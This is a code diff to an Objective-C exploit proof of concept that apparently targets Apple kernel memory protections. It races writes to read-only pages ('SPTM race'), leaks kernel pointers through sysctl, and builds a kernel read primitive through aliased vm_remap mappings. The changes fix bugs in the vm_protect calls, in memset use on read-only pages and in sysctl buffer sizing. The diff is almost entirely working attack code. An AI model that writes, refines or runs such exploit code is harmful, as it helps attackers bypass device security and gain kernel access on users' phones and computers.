@@ -132,7 +132,7 @@ static void *sptm_write_thread(void *arg) {
      (float)successes / RACE_ATTEMPTS * 100.0f];
 
     if (successes == 0) {
-        vm_protect(mach_task_self(), page, 4096, true, VM_PROT_READ | VM_PROT_WRITE);
+        vm_protect(mach_task_self(), page, 4096, false, VM_PROT_READ | VM_PROT_WRITE);
         vm_deallocate(mach_task_self(), page, 4096);
         [report appendString:@"\nVERDICT: SPTM_RACE_FAILED\n"];
         [report appendString:@"No vm_write successes. Race window not hit.\n"];
@@ -141,15 +141,19 @@ static void *sptm_write_thread(void *arg) {
     }
     [report appendString:@"*** SPTM RACE CONFIRMED ***\n"];
 
-    // Verify write landed
-    vm_protect(mach_task_self(), page, 4096, true, VM_PROT_READ | VM_PROT_WRITE);
+    // Verify write landed (set_maximum must be false to restore cur_protection)
+    vm_protect(mach_task_self(), page, 4096, false, VM_PROT_READ | VM_PROT_WRITE);
     uint32_t readback = *(volatile uint32_t *)page;
     [report appendFormat:@"readback: 0x%x (expected 0xDEADBEEF)\n", readback];
 
     // --- Phase 3: kernel read via sysctl copyout ---
     [report appendString:@"\n--- Phase 3: kernel read (sysctl copyout) ---\n"];
 
-    // Make page READ-only again
+    // Clear page while RW, then make READ-only before starting race threads.
+    // Never call userland memset() on `page` while sptm_read_thread is active,
+    // because a userland store to a VM_PROT_READ page raises EXC_BAD_ACCESS.
+    static const uint8_t kZeroChunk[64] = {0};
+    memset((void *)page, 0, 4096);
     vm_protect(mach_task_self(), page, 4096, false, VM_PROT_READ);
 
     ctxA.running = 1; ctxA.page = page;
@@ -161,7 +165,6 @@ static void *sptm_write_thread(void *arg) {
     char osversion[64] = {0};
     char ostype[64] = {0};
     char hostname[64] = {0};
-    int32_t pid_val = 0;
 
     // Try multiple sysctl names
     struct { const char *name; void *buf; size_t sz; } targets[] = {
@@ -172,7 +175,7 @@ static void *sptm_write_thread(void *arg) {
 
     for (int attempt = 0; attempt < 100 && !gotData; attempt++) {
         for (size_t t = 0; t < sizeof(targets)/sizeof(targets[0]); t++) {
-            memset((void *)page, 0, 4096);
+            vm_write(mach_task_self(), page, (vm_offset_t)kZeroChunk, sizeof(kZeroChunk));
             size_t sz = targets[t].sz;
             int err = sysctlbyname(targets[t].name, (void *)page, &sz, NULL, 0);
             if (err == 0) {
@@ -181,7 +184,7 @@ static void *sptm_write_thread(void *arg) {
                     memcpy(targets[t].buf, (void *)page, sz < targets[t].sz ? sz : targets[t].sz);
                     ((char *)targets[t].buf)[targets[t].sz - 1] = 0;
                     gotData = YES;
-                    [self journal:[NSString stringWithFormat:@"sysctl %s = %s", targets[t].name, targets[t].buf]];
+                    [self journal:[NSString stringWithFormat:@"sysctl %s = %s", targets[t].name, (char *)targets[t].buf]];
                     break;
                 }
             }
@@ -207,8 +210,9 @@ static void *sptm_write_thread(void *arg) {
     // --- Phase 4: sysctl read of kernel pointers ---
     [report appendString:@"\n--- Phase 4: sysctl kernel pointer leak ---\n"];
 
-    // Some sysctls return kernel pointers in their data
-    // Try to read kernel addresses via sysctl
+    // Clear page while RW before re-entering VM_PROT_READ race
+    vm_protect(mach_task_self(), page, 4096, false, VM_PROT_READ | VM_PROT_WRITE);
+    memset((void *)page, 0, 4096);
     vm_protect(mach_task_self(), page, 4096, false, VM_PROT_READ);
     ctxA.running = 1; ctxA.page = page;
     ctxB.running = 1; ctxB.page = page;
@@ -217,11 +221,10 @@ static void *sptm_write_thread(void *arg) {
 
     int kptr_count = 0;
     for (int attempt = 0; attempt < 50; attempt++) {
-        memset((void *)page, 0, 4096);
         size_t sz = 4096;
-        // kern.proc_all returns process info with kernel pointers
-        int mib[] = { CTL_KERN, KERN_PROC_ALL };
-        int err = sysctl(mib, 2, (void *)page, &sz, NULL, 0);
+        // Query our own PID so kinfo_proc (~648 bytes) fits inside the 4096-byte page
+        int mib[] = { CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid() };
+        int err = sysctl(mib, 4, (void *)page, &sz, NULL, 0);
         if (err == 0 && sz > 0) {
             volatile uint64_t *p = (volatile uint64_t *)page;
             for (size_t i = 0; i < sz / 8; i++) {
@@ -248,10 +251,10 @@ static void *sptm_write_thread(void *arg) {
     pthread_join(tB, NULL);
 
     // Cleanup
-    vm_protect(mach_task_self(), page, 4096, true, VM_PROT_READ | VM_PROT_WRITE);
+    vm_protect(mach_task_self(), page, 4096, false, VM_PROT_READ | VM_PROT_WRITE);
     vm_deallocate(mach_task_self(), page, 4096);
 
-    // --- Phase 5: kread64 via input→output mapped (kirby technique) ---
+    // --- Phase 5: kread64 via input->output mapped (kirby technique) ---
     [report appendString:@"\n--- Phase 5: kread64 input->output mapped ---\n"];
 
     // Create aliased mapping: two VAs for same physical page
@@ -263,12 +266,12 @@ static void *sptm_write_thread(void *arg) {
         vm_protect(mach_task_self(), inputAddr, 4096, false, VM_PROT_READ);
 
         // Create alias via vm_remap
-        vm_prot_t curProt, maxProt;
+        vm_prot_t curProt = 0, maxProt = 0;
         kr = vm_remap(mach_task_self(), &outputAddr, 4096, 0,
                       VM_FLAGS_ANYWHERE, mach_task_self(), inputAddr,
                       FALSE, &curProt, &maxProt, VM_INHERIT_SHARE);
-        [report appendFormat:@"input=0x%lx output=0x%lx (remap kr=%d)\n",
-         (unsigned long)inputAddr, (unsigned long)outputAddr, kr];
+        [report appendFormat:@"input=0x%lx output=0x%lx (remap kr=%d curProt=0x%x maxProt=0x%x)\n",
+         (unsigned long)inputAddr, (unsigned long)outputAddr, kr, curProt, maxProt];
 
         if (kr == KERN_SUCCESS) {
             // SPTM race on the input page
@@ -281,8 +284,8 @@ static void *sptm_write_thread(void *arg) {
             BOOL kread64 = NO;
             for (int i = 0; i < 200; i++) {
                 size_t sz = 4096;
-                int mib[] = { CTL_KERN, KERN_PROC_ALL };
-                sysctl(mib, 2, (void *)inputAddr, &sz, NULL, 0);
+                int mib[] = { CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid() };
+                sysctl(mib, 4, (void *)inputAddr, &sz, NULL, 0);
                 // Check output alias for kernel pointers
                 volatile uint64_t *op = (volatile uint64_t *)outputAddr;
                 for (size_t j = 0; j < 512; j++) {
@@ -312,7 +315,7 @@ static void *sptm_write_thread(void *arg) {
 
             vm_deallocate(mach_task_self(), outputAddr, 4096);
         }
-        vm_protect(mach_task_self(), inputAddr, 4096, true, VM_PROT_READ | VM_PROT_WRITE);
+        vm_protect(mach_task_self(), inputAddr, 4096, false, VM_PROT_READ | VM_PROT_WRITE);
         vm_deallocate(mach_task_self(), inputAddr, 4096);
     }
 
